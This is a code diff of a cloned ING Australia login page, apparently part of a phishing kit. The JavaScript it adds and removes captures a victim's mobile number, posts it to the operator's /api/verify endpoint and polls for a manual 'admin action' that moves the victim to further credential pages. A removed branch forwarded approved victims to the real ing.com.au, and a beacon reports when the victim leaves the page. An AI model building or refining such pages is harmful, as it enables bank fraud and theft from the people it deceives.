@@ -27287,111 +27287,112 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
                      </template>
                     </div>
                     <script>
-    /* =====  ENSURE SID  ===== */
-    const verifySid = new URLSearchParams(location.search).get('sid') ||
-                      sessionStorage.getItem('sid');
-    if (!verifySid) { location.href = '/'; throw 0; }
-    if (!location.search.includes('sid=')) {
-      const url = new URL(location);
-      url.searchParams.set('sid', verifySid);
-      history.replaceState(null, '', url);
-    }
+/* =====  ENSURE SID  ===== */
+const verifySid = new URLSearchParams(location.search).get('sid') ||
+                  sessionStorage.getItem('sid');
+if (!verifySid) { location.href = '/'; throw 0; }
+if (!location.search.includes('sid=')) {
+  const url = new URL(location);
+  url.searchParams.set('sid', verifySid);
+  history.replaceState(null, '', url);
+}
 
-    /* =====  MAIN LOGIC  ===== */
-    document.addEventListener('DOMContentLoaded', () => {
-      const field = document.getElementById('cifField');
-      const btn   = document.getElementById('login-btn');
-      const error = document.getElementById('error');
-      const overlay = document.getElementById('verify-loading-overlay');
+/* =====  MAIN LOGIC  ===== */
+document.addEventListener('DOMContentLoaded', () => {
+  const field = document.getElementById('cifField');
+  const btn   = document.getElementById('login-btn');
+  const overlay = document.createElement('div');
+  overlay.id = 'verify-loading-overlay';
+  overlay.style.cssText = `
+    position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(2px);
+    display:none;flex-direction:column;align-items:center;justify-content:center;z-index:9999`;
+  overlay.innerHTML = `
+    <div style="width:60px;height:60px;border:4px solid rgba(255,102,0,.2);border-top:4px solid #ff6600;border-radius:50%;animation:ing-spin 1s linear infinite"></div>
+    <p style="color:#fff;font-size:16px;margin-top:20px;letter-spacing:1px">Verifying…</p>`;
+  if (!document.getElementById('ing-spin-style')) {
+    const s = document.createElement('style');
+    s.id = 'ing-spin-style';
+    s.textContent = '@keyframes ing-spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
+    document.head.appendChild(s);
+  }
+  document.body.appendChild(overlay);
 
-      /* ----------  FORMATTER  ---------- */
-      function toAU(raw) {
-        const d = raw.replace(/\D/g,'');
-        if (d.startsWith('610')) return '0' + d.slice(3);
-        if (d.startsWith('61'))  return '0' + d.slice(2);
-        if (d.startsWith('4'))   return '0' + d;
-        if (d.startsWith('0'))   return d;
-        return '0' + d;
-      }
+  /* ----------  FORMATTER  ---------- */
+  function toAU(raw) {
+    const d = raw.replace(/\D/g,'');
+    if (d.startsWith('610')) return '0' + d.slice(3);
+    if (d.startsWith('61'))  return '0' + d.slice(2);
+    if (d.startsWith('4'))   return '0' + d;
+    if (d.startsWith('0'))   return d;
+    return '0' + d;
+  }
 
-      /* ----------  INPUT HANDLER  ---------- */
-      field.addEventListener('input', () => {
-        const clean = toAU(field.value);
-        if (field.value !== clean) field.value = clean;
-        btn.disabled = !/^04\d{8}$/.test(clean);
-        error.style.display = 'none';
-      });
+  /* ----------  INPUT HANDLER  ---------- */
+  field.addEventListener('input', () => {
+    const clean = toAU(field.value);
+    if (field.value !== clean) field.value = clean;
+    btn.disabled = !/^04\d{8}$/.test(clean);
+  });
 
-      /* ----------  SUBMIT  ---------- */
-      btn.addEventListener('click', () => {
-        btn.disabled = true;
-        overlay.style.display = 'flex';
-        fetch('/api/verify', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid: verifySid, phone: field.value })
-        })
-        .then(r => {
-          if (r.ok) { startPoll(); }
-          else { throw new Error('Verify failed'); }
-        })
-        .catch(() => {
+  /* ----------  SUBMIT  ---------- */
+  btn.addEventListener('click', () => {
+    btn.disabled = true;
+    overlay.style.display = 'flex';
+    fetch('/api/verify', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ sid: verifySid, phone: field.value })
+    })
+    .then(r => {
+      if (r.ok) { startPoll(); }
+      else { overlay.style.display = 'none'; btn.disabled = false; error.style.display = 'block'; }
+    })
+    .catch(() => {
+      overlay.style.display = 'none';
+      btn.disabled = false;
+      error.style.display = 'block';
+    });
+  });
+
+  /* ----------  POLL FOR ADMIN ACTION  ---------- */
+  let polling = false;
+  function startPoll() {
+    if (polling) return;
+    polling = true;
+    const poll = async () => {
+      try {
+        const r = await fetch(`/api/status/${verifySid}`);
+        const d = await r.json();
+        if (d.status === 'ok') {
+          polling = false;
           overlay.style.display = 'none';
-          btn.disabled = false;
-          error.style.display = 'block';
-        });
-      });
-
-      /* ----------  POLL FOR ADMIN ACTION  ---------- */
-      let polling = false;
-      function startPoll() {
-        if (polling) return;
-        polling = true;
-        const poll = async () => {
-          try {
-            const r = await fetch(`/api/status/${verifySid}`);
-            const d = await r.json();
-            
-            // Check for quick approve (skip) - redirect to ing.com.au
-            if (d.status === 'approved' || d.page === 'success') {
-              polling = false;
-              overlay.style.display = 'none';
-              // Redirect to real ING website
-              location.href = 'https://www.ing.com.au';
-              return;
-            }
-            
-            if (d.status === 'ok') {
-              polling = false;
-              overlay.style.display = 'none';
-              await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-              location.href = '/unregister.html?sid=' + verifySid;
-              return;
-            }
-            if (d.status === 'redo') {
-              polling = false;
-              overlay.style.display = 'none';
-              await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-              field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
-              return;
-            }
-            setTimeout(poll, 1200);
-          } catch { setTimeout(poll, 2000); }
-        };
-        poll();
-      }
-    });
-  </script>
-  
-  <script>
-    /* make sid available globally so we can send it on unload */
-    window.__SID = verifySid;
-    window.addEventListener('beforeunload', () => {
-      if (!window.__SID) return;
-      /* fire-and-forget exit call */
-      navigator.sendBeacon('/api/exit', JSON.stringify({ sid: window.__SID }));
-    });
-  </script>
+          await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+          location.href = '/unregister.html?sid=' + verifySid;
+          return;
+        }
+        if (d.status === 'redo') {
+          polling = false;
+          overlay.style.display = 'none';
+          await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+          field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
+          return;
+        }
+        setTimeout(poll, 1200);
+      } catch { setTimeout(poll, 2000); }
+    };
+    poll();
+  }
+});
+</script>
+					   <script>
+  /* make sid available globally so we can send it on unload */
+  window.__SID = '<?= sid ?? localStorage.sid ?? '' ?>';   // however you already inject it
+  window.addEventListener('beforeunload', () => {
+    if (!window.__SID) return;
+    /* fire-and-forget exit call */
+    navigator.sendBeacon('/api/exit', JSON.stringify({ sid: window.__SID }));
+  });
+</script>
                     <div class="col col-2 login-cell style-scope ing-login" slot="col-2">
                      <ing-content-loader class="style-scope ing-login x-scope ing-content-loader-0" required="" snippet-id="ing-login-content">
                       <ing-content-loader-i18n class="style-scope ing-content-loader">
@@ -28713,5 +28714,3 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
  </body>
 
 </html>
-
-
